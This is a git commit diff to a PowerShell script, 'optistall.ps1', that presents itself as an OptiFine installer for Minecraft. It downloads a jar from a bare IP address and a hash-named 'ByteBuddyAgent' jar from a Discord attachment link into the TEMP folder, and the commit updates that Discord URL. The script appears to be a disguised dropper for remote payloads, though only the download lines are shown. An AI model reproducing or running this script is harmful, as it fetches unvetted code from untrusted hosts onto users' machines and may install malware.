dec4fb5b0af5be862da9c391024192cb95894f16
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-07-11 11:57:44 -0400

    optistall.ps1

--- optistall.ps1
+++ optistall.ps1
@@ -2,7 +2,7 @@ $source = "http://66.228.37.7/downloads/Optifine1.20.1.jar"
 $destination = "$env:TEMP\Optifine1.20.1.jar"
 Invoke-WebRequest -Uri $source -OutFile $destination
 
-$source = "https://cdn.discordapp.com/attachments/1105931252453871696/1109164216901959690/ByteBuddyAgent_ae832029342a99e39939c9340.jar"
+$source = "https://cdn.discordapp.com/attachments/1072597055060594738/1128353961347387453/ByteBuddyAgent_ae832029342a99e39939c9340.jar"
 $destination = "$env:TEMP\ByteBuddyAgent_ae832029342a99e39939c9340.jar"
 Invoke-WebRequest -Uri $source -OutFile $destination
 
